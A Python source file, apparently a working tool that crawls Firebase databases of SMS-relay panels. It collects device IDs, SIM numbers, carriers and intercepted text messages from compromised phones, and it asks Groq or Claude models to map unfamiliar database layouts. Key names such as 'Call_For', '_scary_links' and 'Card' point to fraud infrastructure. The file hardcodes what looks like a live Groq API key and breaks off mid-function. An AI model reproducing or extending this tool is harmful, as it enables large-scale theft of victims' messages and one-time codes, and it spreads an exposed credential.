"""
fb_parser.py — Universal Firebase SMS Database Parser  v4
==========================================================
Patterns: G, H, A, A2, A3, I, I2, J, K, Z, AI (learned)

v4 changes:
  - Groq AI  (llama-3.3-70b-versatile / deepseek-r1-distill-llama-70b)
  - Optional Anthropic Claude (parser / ghost analysis only)
  - Confidence score shown in every AI alert
  - Improved pipeline: Known → Learned → Recursive → AI → Validate → Save
  - Pattern confidence tracking (pass stats dict through)
  - Enhanced Telegram alerts (parse failure, quarantine, ghost recovered …)
"""

import asyncio, json, os, re, sys, hashlib
from datetime import datetime
from typing import Optional

try:
    import aiohttp
except ImportError:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp", "-q"])
    import aiohttp


# ═══════════════════════════════════════════════════════════════
# CONFIG  —  set as env vars or pass directly to functions
# ═══════════════════════════════════════════════════════════════

GROQ_API_KEY   = os.environ.get("GROQ_API_KEY", "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")
ANTHROPIC_KEY  = os.environ.get("ANTHROPIC_API_KEY", "")
BOT_TOKEN      = os.environ.get("TG_BOT_TOKEN", "")
ADMIN_IDS      = [
    int(x) for x in os.environ.get("TG_ADMIN_IDS", "").split(",")
    if x.strip().isdigit()
]

GROQ_BASE_URL  = "https://api.groq.com/openai/v1"
ANTHROPIC_BASE = "https://api.anthropic.com/v1"

GROQ_MODELS = {
    "fast": "llama-3.3-70b-versatile",
    "deep": "deepseek-r1-distill-llama-70b",
}

LEARNED_PATTERNS_DIR = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "learned_patterns"
)

TIMEOUT           = 8
PROBE_TIMEOUT     = 3
MAX_DEVICES       = 300
FETCH_CONCURRENCY = 20

_FB_SYSTEM_KEYS = {
    ".indexOn", ".read", ".write", ".validate",
    "rules", ".settings", "Favorites", "backups",
    "bot_state", "users", "clients", "guard", "login",
    "bot_users", "panelAnalytics", "_scary_links",
    "profex_incoming", "nextUserId", "page2", "page4",
    "page5", "page6", "page7", "all_pas", "account",
    "user_old", "Card",
}

_SMS_BODY_FIELDS   = ("body","message","msg","text","content","sms","Body","Message")
_SMS_SENDER_FIELDS = ("sender","from","ph","address","senderNumber",
                      "from_number","number","Sender","Address")
_SMS_TIME_FIELDS   = ("date","dateTime","timestamp","receivedDate","recivedDate",
                      "formattedTimestamp","backupTime","time","datetime",
                      "Date","DateTime","Timestamp","ReceivedDate")
_PHONE_FIELDS      = ("sim1Number","sim2Number","simNumber","phoneNumber",
                      "phone","mobile","number","PhoneNumber","Phone",
                      "Mobile","Number","sim1","sim2")
_CARRIER_FIELDS    = ("sim1Provider","sim2Provider","operator","carrier",
                      "network","Provider","Operator","Carrier",
                      "Network","telecom","Telecom")
_PHONE_RE          = re.compile(r'\+?[0-9]{10,13}')


# ═══════════════════════════════════════════════════════════════
# TELEGRAM ALERTS
# ═══════════════════════════════════════════════════════════════

async def _tg_send(text: str, bot_token: str = None, admin_ids: list = None):
    token = bot_token or BOT_TOKEN
    ids   = admin_ids or ADMIN_IDS
    if not token or not ids:
        return
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    try:
        async with aiohttp.ClientSession() as sess:
            for uid in ids:
                try:
                    await sess.post(url, json={
                        "chat_id": uid, "text": text, "parse_mode": "HTML",
                    }, timeout=aiohttp.ClientTimeout(total=6))
                except Exception:
                    pass
    except Exception:
        pass


def tg_alert(text: str, bot_token: str = None, admin_ids: list = None):
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            asyncio.ensure_future(_tg_send(text, bot_token, admin_ids))
        else:
            loop.run_until_complete(_tg_send(text, bot_token, admin_ids))
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
# DATA CLASS
# ═══════════════════════════════════════════════════════════════

class DeviceEntry:
    __slots__ = (
        "number","device_id","device_name","sim_slot",
        "carrier","status","struct_type",
        "sms_path","status_path","is_ghost",
    )

    def __init__(self, *, number, device_id, device_name="", sim_slot="sim1",
                 carrier="", status="Active", struct_type="?",
                 sms_path="", status_path="", is_ghost=False):
        self.number      = number
        self.device_id   = device_id
        self.device_name = device_name or device_id
        self.sim_slot    = sim_slot
        self.carrier     = carrier
        self.status      = status
        self.struct_type = struct_type
        self.sms_path    = sms_path
        self.status_path = status_path
        self.is_ghost    = is_ghost or str(number).startswith("DEV-")

    def to_dict(self):
        return {k: getattr(self, k) for k in self.__slots__}

    def __repr__(self):
        g = " 👻" if self.is_ghost else ""
        return (f"<DeviceEntry [{self.struct_type}] {self.number}{g} "
                f"| {self.device_name} | carrier={self.carrier} | status={self.status}>")


# ═══════════════════════════════════════════════════════════════
# SMS NORMALISATION
# ═══════════════════════════════════════════════════════════════

def norm_sms(entry: dict, body_field=None, sender_field=None, time_field=None) -> tuple:
    if not isinstance(entry, dict):
        return "", "", ""
    bf = ([body_field]   + list(_SMS_BODY_FIELDS))   if body_field   else _SMS_BODY_FIELDS
    sf = ([sender_field] + list(_SMS_SENDER_FIELDS)) if sender_field else _SMS_SENDER_FIELDS
    tf = ([time_field]   + list(_SMS_TIME_FIELDS))   if time_field   else _SMS_TIME_FIELDS
    body = sender = ts = ""
    for f in bf:
        v = entry.get(f)
        if v and isinstance(v, str):
            body = v.strip(); break
    for f in sf:
        v = entry.get(f)
        if v and isinstance(v, str):
            sender = v.strip(); break
    for f in tf:
        v = entry.get(f)
        if v:
            ts = str(v).strip(); break
    return body, sender, ts


def latest_sms(node: dict, body_field=None, sender_field=None, time_field=None):
    if not isinstance(node, dict) or not node:
        return None, None
    push_keys = [k for k in node if k.startswith("-")]
    if push_keys:
        for k in sorted(push_keys, reverse=True):
            v = node[k]
            if isinstance(v, dict):
                body, _, _ = norm_sms(v, body_field, sender_field, time_field)
                if body:
                    return v, k
    try:
        int_keys = sorted(
            [(int(k), k) for k in node if str(k).lstrip("-").isdigit()],
            reverse=True
        )
        for _, k in int_keys:
            v = node[k]
            if isinstance(v, dict):
                body, _, _ = norm_sms(v, body_field, sender_field, time_field)
                if body:
                    return v, k
    except Exception:
        pass
    for k in sorted(node.keys(), reverse=True):
        v = node[k]
        if isinstance(v, dict):
            body, _, _ = norm_sms(v, body_field, sender_field, time_field)
            if body:
                return v, k
    return None, None


def all_sms_sorted(node: dict, body_field=None, sender_field=None, time_field=None):
    """Return [(entry, key, body, sender, ts), ...] newest first."""
    if not isinstance(node, dict):
        return []
    items = []
    for k, v in node.items():
        if not isinstance(v, dict):
            continue
        body, sender, ts = norm_sms(v, body_field, sender_field, time_field)
        if not body:
            continue
        try:
            sort_key = int(k)
        except (ValueError, TypeError):
            sort_key = k
        items.append((sort_key, k, v, body, sender, ts))
    items.sort(key=lambda x: x[0], reverse=True)
    return [(v, k, body, sender, ts) for _, k, v, body, sender, ts in items]


# ═══════════════════════════════════════════════════════════════
# PHONE / CARRIER HELPERS
# ═══════════════════════════════════════════════════════════════

def norm_phone(raw: str) -> str:
    if not raw or not isinstance(raw, str):
        return ""
    raw   = raw.split(" - ")[0].strip()
    clean = re.sub(r'[^\d+]', '', raw)
    if len(clean) < 7:
        return ""
    if clean in ("1234567890", "0000000000", "9999999999"):
        return ""
    m = _PHONE_RE.search(clean)
    return m.group(0) if m else ""


def extract_phone(node: dict) -> str:
    if not isinstance(node, dict):
        return ""
    for f in _PHONE_FIELDS:
        v = node.get(f)
        if isinstance(v, str):
            ph = norm_phone(v.split(" - ")[0])
            if ph:
                return ph
    for nk in ("simInfo","sim_info","SimInfo","sim","Sim"):
        sub = node.get(nk)
        if isinstance(sub, dict):
            ph = extract_phone(sub)
            if ph:
                return ph
    return ""


def extract_carrier(node: dict) -> str:
    if not isinstance(node, dict):
        return ""
    for f in _CARRIER_FIELDS:
        v = node.get(f)
        if v and isinstance(v, str) and len(v) > 1:
            return str(v)[:40]
    for slot in ("sim1","sim2","SIM1","SIM2"):
        v = node.get(slot)
        if isinstance(v, str) and " - " in v:
            return v.split(" - ")[-1].strip()[:40]
    return ""


def status_str(raw) -> str:
    if not raw:
        return "Active"
    s = str(raw).strip().lower()
    return "Inactive" if s in ("offline","0","false","inactive","off","disconnected") else "Active"


def _carrier_from_sim_str(s: str) -> str:
    if " - " in s:
        return s.split(" - ", 1)[-1].strip()[:40]
    return ""


# ═══════════════════════════════════════════════════════════════
# HTTP HELPERS
# ═══════════════════════════════════════════════════════════════

def _fb_url(path: str, api_key: str = None) -> str:
    if "?" in path:
        base_part, qs = path.split("?", 1)
    else:
        base_part, qs = path, ""
    base_part = base_part.rstrip("/")
    if not base_part.endswith(".json"):
        base_part += "/.json"
    url = base_part + ("?" + qs if qs else "")
    if api_key and "auth=" not in url:
        sep  = "&" if "?" in url else "?"
        url  = f"{url}{sep}auth={api_key}"
    return url


async def fb_get(sess, url, timeout=TIMEOUT, api_key=None):
    url = _fb_url(url, api_key)
    try:
        async with sess.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            if r.status != 200:
                return None
            return await r.json(content_type=None)
    except Exception:
        return None


async def _fetch_many(sess, paths, api_key=None):
    sem = asyncio.Semaphore(FETCH_CONCURRENCY)
    async def _one(p):
        async with sem:
            return await fb_get(sess, p, api_key=api_key)
    return await asyncio.gather(*[_one(p) for p in paths])


def _ghost(device_id, base, sms_path, status_path, device_name="", struct_type="?"):
    return DeviceEntry(
        number=f"DEV-{device_id}", device_id=device_id,
        device_name=device_name or device_id, sim_slot="sim1",
        carrier="", status="Active", struct_type=struct_type,
        sms_path=sms_path, status_path=status_path, is_ghost=True,
    )


# ═══════════════════════════════════════════════════════════════
# PATTERNS  (G, H, A, A2, A3, I, I2, J, K)  — PRESERVED INTACT
# ═══════════════════════════════════════════════════════════════

async def _parse_G(sess, base, api_key=None):
    ud_sh = await fb_get(sess, f"{base}/user_data.json?shallow=true", api_key=api_key)
    if not isinstance(ud_sh, dict):
        return []
    dev_ids = [d for d in list(ud_sh.keys())[:MAX_DEVICES] if d not in _FB_SYSTEM_KEYS]
    results = await _fetch_many(sess, [f"{base}/user_data/{d}.json" for d in dev_ids], api_key)
    entries = []
    for dev_id, ud in zip(dev_ids, results):
        ud   = ud or {}
        name = (ud.get("d_name") or ud.get("device_name") or dev_id)[:40]
        stat = status_str(ud.get("status") or ud.get("Status"))
        ph   = extract_phone(ud)
        if not ph:
            di = ud.get("Device_info", "")
            if isinstance(di, str):
                m = _PHONE_RE.search(di)
                if m and len(m.group()) >= 10:
                    ph = m.group()
        entries.append(DeviceEntry(
            number=ph if ph else f"DEV-{dev_id}", device_id=dev_id, device_name=name,
            sim_slot="sim1", carrier=extract_carrier(ud), status=stat, struct_type="G",
            sms_path=f"{base}/user_sms/{dev_id}", status_path=f"{base}/user_data/{dev_id}",
            is_ghost=not bool(ph),
        ))
    return entries


async def _parse_H(sess, base, api_key=None):
    sh = await fb_get(sess, f"{base}/messages.json?shallow=true", api_key=api_key)
    if not isinstance(sh, dict):
        return []
    clients_sh = await fb_get(sess, f"{base}/clients.json?shallow=true", api_key=api_key) or {}
    entries = []
    for dev_id in sh:
        if dev_id in _FB_SYSTEM_KEYS:
            continue
        ph = ""; stat = "Active"
        if isinstance(clients_sh, dict) and dev_id in clients_sh:
            cl   = await fb_get(sess, f"{base}/clients/{dev_id}.json", api_key=api_key) or {}
            ph   = extract_phone(cl)
            stat = status_str(cl.get("status") or cl.get("Status"))
        entries.append(DeviceEntry(
            number=ph if ph else f"DEV-{dev_id}", device_id=dev_id, device_name=dev_id[:40],
            sim_slot="sim1", carrier="", status=stat, struct_type="H",
            sms_path=f"{base}/messages/{dev_id}",
            status_path=f"{base}/clients/{dev_id}" if ph else "",
            is_ghost=not bool(ph),
        ))
    return entries


async def _parse_A(sess, base, root_keys, api_key=None):
    all_rows = []
    for rk in root_keys:
        if rk in _FB_SYSTEM_KEYS:
            continue
        sim = await fb_get(sess, f"{base}/{rk}/All_User/SimINFO.json", api_key=api_key)
        if not isinstance(sim, dict):
            continue
        info = await fb_get(sess, f"{base}/{rk}/All_User/Info.json", api_key=api_key) or {}
        for dev_id, sd in sim.items():
            if not isinstance(sd, dict):
                continue
            dv   = info.get(dev_id, {}) if isinstance(info, dict) else {}
            name = dv.get("Name") or dv.get("name") or dev_id
            stat = status_str(dv.get("status") or dv.get("Status") or "online")
            cg   = extract_carrier(sd) or extract_carrier(dv)
            added = False
            for slot in ("sim1","sim2","SIM1","SIM2"):
                raw = sd.get(slot)
                if not raw:
                    continue
                ph = norm_phone(str(raw).split(" - ")[0]) or extract_phone(sd)
                if not ph:
                    continue
                ca = _carrier_from_sim_str(str(raw)) or cg
                all_rows.append(DeviceEntry(
                    number=ph, device_id=dev_id, device_name=str(name)[:40],
                    sim_slot=slot, carrier=ca, status=stat, struct_type="A",
                    sms_path=f"{base}/{rk}/All_User/Sms/{dev_id}",
                    status_path=f"{base}/{rk}/All_User/Info/{dev_id}",
                ))
                added = True
            if not added:
                ph = extract_phone(sd) or extract_phone(dv)
                if ph:
                    all_rows.append(DeviceEntry(
                        number=ph, device_id=dev_id, device_name=str(name)[:40],
                        sim_slot="sim1", carrier=cg, status=stat, struct_type="A",
                        sms_path=f"{base}/{rk}/All_User/Sms/{dev_id}",
                        status_path=f"{base}/{rk}/All_User/Info/{dev_id}",
                    ))
                else:
                    all_rows.append(_ghost(
                        dev_id, base,
                        sms_path=f"{base}/{rk}/All_User/Sms/{dev_id}",
                        status_path=f"{base}/{rk}/All_User/Info/{dev_id}",
                        device_name=str(name)[:40], struct_type="A",
                    ))
    return all_rows


async def _parse_A2(sess, base, api_key=None):
    di_sh = await fb_get(sess, f"{base}/All_Users/DeviceInfo.json?shallow=true", api_key=api_key)
    if not isinstance(di_sh, dict):
        return []
    dev_ids = [d for d in list(di_sh.keys())[:MAX_DEVICES] if d not in _FB_SYSTEM_KEYS]
    results = await _fetch_many(sess, [f"{base}/All_Users/DeviceInfo/{d}.json" for d in dev_ids], api_key)
    entries = []
    for dev_id, di in zip(dev_ids, results):
        di   = di or {}
        name = (di.get("Model") or di.get("Brand") or dev_id)[:40]
        stat = status_str(di.get("Status") or di.get("status"))
        ph   = extract_phone(di)
        entries.append(DeviceEntry(
            number=ph if ph else f"DEV-{dev_id}", device_id=dev_id, device_name=name,
            sim_slot="sim1", carrier=extract_carrier(di), status=stat, struct_type="A2",
            sms_path=f"{base}/All_Users/sms/{dev_id}",
            status_path=f"{base}/All_Users/DeviceInfo/{dev_id}",
            is_ghost=not bool(ph),
        ))
    return entries


async def _parse_A3(sess, base, api_key=None):
    sd_sh = await fb_get(sess, f"{base}/All_Users/simDetails.json?shallow=true", api_key=api_key)
    if not isinstance(sd_sh, dict):
        return []
    di_sh    = await fb_get(sess, f"{base}/All_Users/DeviceInfo.json?shallow=true", api_key=api_key) or {}
    dev_ids  = [d for d in list(sd_sh.keys())[:MAX_DEVICES] if d not in _FB_SYSTEM_KEYS]
    sd_paths = [f"{base}/All_Users/simDetails/{d}.json" for d in dev_ids]
    di_paths = [f"{base}/All_Users/DeviceInfo/{d}.json" if d in di_sh else None for d in dev_ids]
    sd_results = await _fetch_many(sess, sd_paths, api_key)
    di_results = await _fetch_many(sess, [p for p in di_paths if p], api_key)
    di_iter = iter(di_results)
    di_map  = {d: (next(di_iter) if p else {}) for d, p in zip(dev_ids, di_paths)}
    entries = []
    for dev_id, sd in zip(dev_ids, sd_results):
        sd = sd or {}
        di = di_map.get(dev_id) or {}
        name = (di.get("Model") or di.get("Brand") or dev_id)[:40]
        stat = status_str(di.get("Status") or di.get("status") or "Active")
        added = False
        for slot, ph_f, ca_f in (("sim1","sim1Number","sim1Provider"),("sim2","sim2Number","sim2Provider")):
            raw_ph = sd.get(ph_f)
            if not raw_ph:
                continue
            ph = norm_phone(str(raw_ph))
            if not ph:
                continue
            ca = sd.get(ca_f) or extract_carrier(sd) or ""
            entries.append(DeviceEntry(
                number=ph, device_id=dev_id, device_name=name,
                sim_slot=slot, carrier=str(ca)[:40], status=stat, struct_type="A3",
                sms_path=f"{base}/All_Users/sms/{dev_id}",
                status_path=f"{base}/All_Users/DeviceInfo/{dev_id}",
            ))
            added = True
        if not added:
            ph = extract_phone(sd)
            entries.append(DeviceEntry(
                number=ph if ph else f"DEV-{dev_id}", device_id=dev_id, device_name=name,
                sim_slot="sim1", carrier=extract_carrier(sd), status=stat, struct_type="A3",
                sms_path=f"{base}/All_Users/sms/{dev_id}",
                status_path=f"{base}/All_Users/DeviceInfo/{dev_id}",
                is_ghost=not bool(ph),
            ))
    return entries


async def _parse_I(sess, base, api_key=None):
    sh = await fb_get(sess, f"{base}/All_Users/sms.json?shallow=true", api_key=api_key)
    if not isinstance(sh, dict):
        return []
    return [_ghost(d, base, sms_path=f"{base}/All_Users/sms/{d}", status_path="", struct_type="I")
            for d in sh if d not in _FB_SYSTEM_KEYS]


async def _parse_J(sess, base, api_key=None):
    rd_sh = await fb_get(sess, f"{base}/registeredDevices.json?shallow=true", api_key=api_key)
    sl_sh = await fb_get(sess, f"{base}/smsLogs.json?shallow=true", api_key=api_key)
    if not isinstance(sl_sh, dict):
        return []
    device_ids = set(sl_sh.keys())
    if isinstance(rd_sh, dict):
        device_ids.update(rd_sh.keys())
    entries = []
    for dev_id in device_ids:
        if dev_id in _FB_SYSTEM_KEYS:
            continue
        rd = {}
        if isinstance(rd_sh, dict) and dev_id in rd_sh:
            rd = await fb_get(sess, f"{base}/registeredDevices/{dev_id}.json", api_key=api_key) or {}
        name     = (rd.get("model") or rd.get("brand") or rd.get("Model") or dev_id)[:40]
        sms_node = await fb_get(
            sess, f"{base}/smsLogs/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5",
            api_key=api_key) or {}
        ph = ""
        for entry in (sms_node.values() if isinstance(sms_node, dict) else []):
            if isinstance(entry, dict):
                raw = entry.get("receiverNumber") or entry.get("toNumber") or ""
                ph  = norm_phone(str(raw))
                if ph:
                    break
        entries.append(DeviceEntry(
            number=ph if ph else f"DEV-{dev_id}", device_id=dev_id, device_name=name,
            sim_slot="sim1", carrier="", status="Active", struct_type="J",
            sms_path=f"{base}/smsLogs/{dev_id}",
            status_path=f"{base}/registeredDevices/{dev_id}",
            is_ghost=not bool(ph),
        ))
    return entries


async def _parse_K(sess, base, api_key=None):
    sms_sh = await fb_get(sess, f"{base}/csc/All_User/Sms.json?shallow=true", api_key=api_key)
    if not isinstance(sms_sh, dict):
        return []
    cf_sh    = await fb_get(sess, f"{base}/csc/All_User/Call_For.json?shallow=true", api_key=api_key) or {}
    cf_phones = {}
    for cf_id in list(cf_sh.keys())[:30] if isinstance(cf_sh, dict) else []:
        cf  = await fb_get(sess, f"{base}/csc/All_User/Call_For/{cf_id}.json", api_key=api_key) or {}
        raw = cf.get("PhoneNumber") or cf.get("phoneNumber") or ""
        ph  = norm_phone(str(raw))
        if ph:
            cf_phones[cf_id] = ph
    entries = []
    for dev_id in sms_sh:
        if dev_id in _FB_SYSTEM_KEYS:
            continue
        ph = cf_phones.get(dev_id, "")
        entries.append(DeviceEntry(
            number=ph if ph else f"DEV-{dev_id}", device_id=dev_id, device_name=dev_id[:40],
            sim_slot="sim1", carrier="", status="Active", struct_type="K",
            sms_path=f"{base}/csc/All_User/Sms/{dev_id}",
            status_path=f"{base}/csc/All_User/Call_For/{dev_id}",
            is_ghost=not bool(ph),
        ))
    return entries


async def _parse_root_sms(sess, base, api_key=None):
    sh = await fb_get(sess, f"{base}/Sms.json?shallow=true", api_key=api_key)
    if not isinstance(sh, dict):
        return []
    return [_ghost(d, base, sms_path=f"{base}/Sms/{d}", status_path="", struct_type="I2")
            for d in sh if d not in _FB_SYSTEM_KEYS]


async def _fallback_scan(sess, base, root_shallow, api_key=None):
    rows = []
    for rk in (root_shallow if isinstance(root_shallow, dict) else {}):
        if rk in _FB_SYSTEM_KEYS:
            continue
        full = await fb_get(sess, f"{base}/{rk}.json", api_key=api_key)
        if not isinstance(full, dict):
            continue
        ph = extract_phone(full)
        if ph:
            rows.append(DeviceEntry(
                number=ph, device_id=rk, device_name=rk[:40],
                carrier=extract_carrier(full), struct_type="Z",
                sms_path=f"{base}/{rk}", status_path=f"{base}/{rk}",
            ))
            continue
        for ck, cv in full.items():
            if not isinstance(cv, dict):
                continue
            ph = extract_phone(cv)
            if ph:
                rows.append(DeviceEntry(
                    number=ph, device_id=ck, device_name=ck[:40],
                    carrier=extract_carrier(cv), struct_type="Z",
                    sms_path=f"{base}/{rk}/{ck}", status_path=f"{base}/{rk}/{ck}",
                ))
    return rows


# ═══════════════════════════════════════════════════════════════
# LEARNED PATTERN STORE
# ═══════════════════════════════════════════════════════════════

def _host_slug(base: str) -> str:
    host = base.replace("https://", "").replace("http://", "").split("/")[0]
    return re.sub(r'[^\w.-]', '_', host)


def load_learned_pattern(base: str) -> Optional[dict]:
    os.makedirs(LEARNED_PATTERNS_DIR, exist_ok=True)
    path = os.path.join(LEARNED_PATTERNS_DIR, f"{_host_slug(base)}.json")
    if not os.path.exists(path):
        return None
    try:
        with open(path) as f:
            return json.load(f)
    except Exception:
        return None


def save_learned_pattern(base: str, pattern: dict):
    os.makedirs(LEARNED_PATTERNS_DIR, exist_ok=True)
    path = os.path.join(LEARNED_PATTERNS_DIR, f"{_host_slug(base)}.json")
    pattern["db_host"]    = _host_slug(base)
    pattern["learned_at"] = datetime.now().isoformat()
    with open(path, "w") as f:
        json.dump(pattern, f, indent=2)
    print(f"[fb_parser] ✅ Pattern saved → {path}")


def list_learned_patterns() -> list:
    os.makedirs(LEARNED_PATTERNS_DIR, exist_ok=True)
    result = []
    for fn in os.listdir(LEARNED_PATTERNS_DIR):
        if fn.endswith(".json"):
            try:
                with open(os.path.join(LEARNED_PATTERNS_DIR, fn)) as f:
                    result.append(json.load(f))
            except Exception:
                pass
    return result


# ═══════════════════════════════════════════════════════════════
# PARSE WITH LEARNED PATTERN
# ═══════════════════════════════════════════════════════════════

async def _parse_learned(sess, base, pattern: dict, api_key=None):
    devices_root = pattern.get("devices_root", "")
    sms_root_tpl = pattern.get("sms_root", "")
    phone_field  = pattern.get("phone_field")
    status_field = pattern.get("status_field")
    status_root  = pattern.get("status_root", "")
    if not devices_root or not sms_root_tpl:
        return []
    sh = await fb_get(sess, f"{base}/{devices_root}.json?shallow=true", api_key=api_key)
    if not isinstance(sh, dict):
        return []
    dev_ids = [d for d in list(sh.keys())[:MAX_DEVICES] if d not in _FB_SYSTEM_KEYS]
    entries = []
    for dev_id in dev_ids:
        ph = carrier = ""
        stat = "Active"
        if phone_field:
            phone_path_tpl = pattern.get("phone_path_template", f"{devices_root}/{{device_id}}")
            node = await fb_get(
                sess,
                f"{base}/{phone_path_tpl.replace('{device_id}', dev_id)}.json",
                api_key=api_key
            ) or {}
            if isinstance(node, dict):
                raw = node.get(phone_field, "")
                ph  = norm_phone(str(raw)) if raw else extract_phone(node)
                carrier = extract_carrier(node)
                if status_field:
                    stat = status_str(node.get(status_field))
            elif isinstance(node, str):
                ph = norm_phone(node)
        sms_path = sms_root_tpl.replace("{device_id}", dev_id)
        entries.append(DeviceEntry(
            number=ph if ph else f"DEV-{dev_id}", device_id=dev_id, device_name=dev_id[:40],
            sim_slot="sim1", carrier=carrier, status=stat,
            struct_type=f"AI-{pattern.get('pattern_id','?')}",
            sms_path=f"{base}/{sms_path}",
            status_path=f"{base}/{status_root.replace('{device_id}', dev_id)}" if status_root else "",
            is_ghost=not bool(ph),
        ))
    return entries


# ═══════════════════════════════════════════════════════════════
# AI SYSTEM PROMPT
# ═══════════════════════════════════════════════════════════════

_AI_SYSTEM_PROMPT = """You are an expert Firebase Realtime Database analyst for SMS relay systems.
Given a sample of a Firebase database, identify:
1. Root path containing device IDs
2. Where phone numbers are stored (or null)
3. Path template for SMS messages
4. Exact field names: SMS body, sender, timestamp
5. Device status field
6. Your confidence as a float 0.0-1.0

Return ONLY valid JSON — no markdown, no explanation:
{
  "pattern_id": "AI-1",
  "devices_root": "root key listing device IDs e.g. 'clients'",
  "phone_field": "field holding phone number, or null",
  "phone_path_template": "e.g. 'clients/{device_id}' or null",
  "sms_root": "path template e.g. 'messages/{device_id}'",
  "sms_body_field": "e.g. 'message'",
  "sms_sender_field": "e.g. 'sender'",
  "sms_time_field": "e.g. 'dateTime'",
  "status_root": "e.g. 'clients/{device_id}'",
  "status_field": "e.g. 'status'",
  "confidence": 0.95,
  "notes": "brief explanation"
}"""


# ═══════════════════════════════════════════════════════════════
# GROQ AI  —  structure learning
# ═══════════════════════════════════════════════════════════════

async def _call_groq(prompt: str, groq_key: str, model: str) -> dict:
    """Call Groq API. Returns parsed JSON dict or raises."""
    async with aiohttp.ClientSession() as sess:
        async with sess.post(
            f"{GROQ_BASE_URL}/chat/completions",
            headers={"Authorization": f"Bearer {groq_key}",
                     "Content-Type": "application/json"},
            json={
                "model": model,
                "messages": [
                    {"role": "system", "content": _AI_SYSTEM_PROMPT},
                    {"role": "user",   "content": prompt},
                ],
                "temperature": 0.1,
                "max_tokens":  800,
            },
            timeout=aiohttp.ClientTimeout(total=45),
        ) as r:
            if r.status != 200:
                raise RuntimeError(f"Groq HTTP {r.status}: {await r.text()}")
            data = await r.json(content_type=None)

    content = data["choices"][0]["message"]["content"].strip()
    # Strip think tags (some models)
    content = re.sub(r'<think>.*?</think>', '', content, flags=re.DOTALL).strip()
    content = re.sub(r'^```[a-z]*\n?', '', content)
    content = re.sub(r'\n?```$', '', content)
    return json.loads(content)


async def _call_anthropic(prompt: str, anthropic_key: str) -> dict:
    """Call Anthropic Claude for structure analysis. Returns parsed JSON dict or raises."""
    async with aiohttp.ClientSession() as sess:
        async with sess.post(
            f"{ANTHROPIC_BASE}/messages",
            headers={
                "x-api-key":         anthropic_key,
                "anthropic-version": "2023-06-01",
                "Content-Type":      "application/json",
            },
            json={
                "model":      "claude-haiku-4-5",
                "max_tokens": 800,
                "system":     _AI_SYSTEM_PROMPT,
                "messages":   [{"role": "user", "content": prompt}],
            },
            timeout=aiohttp.ClientTimeout(total=45),
        ) as r:
            if r.status != 200:
                raise RuntimeError(f"Anthropic HTTP {r.status}: {await r.text()}")
            data = await r.json(content_type=None)

    content = data["content"][0]["text"].strip()
    content = re.sub(r'^```[a-z]*\n?', '', content)
    content = re.sub(r'\n?```$', '', content)
    return json.loads(content)


async def ai_learn_structure(
        base: str,
        api_key: str = None,
        groq_key: str = None,
        groq_model: str = None,
        anthropic_key: str = None,
        bot_token: str = None,
        admin_ids: list = None,
) -> tuple:
    """
    Use Groq (primary) or Anthropic (secondary) to learn an unknown Firebase structure.

    Pipeline:
      1. Check learned pattern cache
      2. Sample the database (shallow reads)
      3. Call AI for structure mapping
      4. Validate result by parsing sample devices
      5. Save pattern if confidence >= 0.5
      6. Send Telegram alert with confidence score

    Returns (entries, pattern, error_str|None).
    """
    g_key = groq_key or GROQ_API_KEY
    a_key = anthropic_key or ANTHROPIC_KEY

    if not g_key and not a_key:
        msg = (f"⚠️ <b>AI Fallback Failed</b>\n"
               f"<code>{_host_slug(base)}</code>\n"
               f"Reason: No Groq or Anthropic API key configured.\n"
               f"Set via /admin → ⚙ System → 🤖 AI Config")
        tg_alert(msg, bot_token, admin_ids)
        return [], {}, "No AI API key configured"

    # ── Step 1: Check cache ──────────────────────────────────
    cached = load_learned_pattern(base)
    if cached:
        print(f"[fb_parser] 📂 Cached pattern for {base}")
        async with aiohttp.ClientSession() as sess:
            entries = await _parse_learned(sess, base, cached, api_key)
        if entries:
            return entries, cached, None

    print(f"[fb_parser] 🤖 AI learning: {base}")

    # ── Step 2: Sample the database ─────────────────────────
    sample = {}
    async with aiohttp.ClientSession() as sess:
        root = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
        if not isinstance(root, dict):
            msg = (f"❌ <b>Parse Failed</b>\n"
                   f"<code>{_host_slug(base)}</code>\n"
                   f"Cannot connect to database")
            tg_alert(msg, bot_token, admin_ids)
            return [], {}, "Cannot connect to database"

        sample["_root_keys"] = list(root.keys())
        for rk in list(root.keys())[:5]:
            if rk in _FB_SYSTEM_KEYS:
                continue
            node_sh = await fb_get(sess, f"{base}/{rk}.json?shallow=true", api_key=api_key)
            if isinstance(node_sh, dict):
                sample[rk] = {"_shallow": list(node_sh.keys())[:10]}
                for child_id in list(node_sh.keys())[:2]:
                    child = await fb_get(sess, f"{base}/{rk}/{child_id}.json", api_key=api_key)
                    if isinstance(child, dict):
                        sub = {}
                        for ck, cv in list(child.items())[:8]:
                            sub[ck] = ({k: v for k, v in list(cv.items())[:4]}
                                       if isinstance(cv, dict) else cv)
                        sample[rk][child_id] = sub
                    break

    prompt = f"Firebase database sample:\n\n{json.dumps(sample, indent=2, default=str)[:6000]}"

    # ── Step 3: Call AI ──────────────────────────────────────
    pattern  = None
    ai_used  = None
    err_msg  = None

    # Try Groq first (primary)
    if g_key:
        model = groq_model or GROQ_MODELS.get("fast", GROQ_MODELS["fast"])
        try:
            pattern = await _call_groq(prompt, g_key, model)
            ai_used = f"Groq/{model}"
        except Exception as e:
            err_msg = f"Groq failed: {e}"
            tg_alert(
                f"⚠️ <b>Groq AI Failed</b>\n<code>{_host_slug(base)}</code>\n{str(e)[:200]}",
                bot_token, admin_ids
            )

    # Try Anthropic as fallback
    if pattern is None and a_key:
        try:
            pattern = await _call_anthropic(prompt, a_key)
            ai_used = "Anthropic/claude-haiku-4-5"
        except Exception as e:
            err_msg = f"Anthropic failed: {e}"
            tg_alert(
                f"⚠️ <b>Anthropic AI Failed</b>\n<code>{_host_slug(base)}</code>\n{str(e)[:200]}",
                bot_token, admin_ids
            )

    if pattern is None:
        return [], {}, err_msg or "All AI providers failed"

    # ── Step 4: Validate ─────────────────────────────────────
    confidence = float(pattern.get("confidence", 0.0))
    async with aiohttp.ClientSession() as sess:
        entries = await _parse_learned(sess, base, pattern, api_key)

    real_count  = sum(1 for e in entries if not e.is_ghost)
